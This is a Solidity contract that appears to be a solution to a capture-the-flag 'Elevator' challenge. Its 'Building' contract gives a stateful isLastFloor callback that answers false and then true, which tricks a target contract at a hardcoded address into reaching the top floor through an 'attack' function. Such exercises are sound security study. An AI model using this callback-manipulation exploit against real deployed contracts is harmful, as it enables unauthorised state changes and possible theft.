// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building{
    address owner;
    address victim;
    uint counter;
    IElevator victimContract;

    constructor(address _owner){
        owner = _owner;
        victimContract = IElevator(0xE255E682D8a8C0F43Ee5b6B4b60326C8eBb083ad);
    }

    function isLastFloor(uint256) public returns (bool){
        if(counter == 0){
            counter++;
            return false;
        }else{
            return true;
        }   
    }

    function attack(uint256 _floor) public {
        victimContract.goTo(_floor);
    }

}
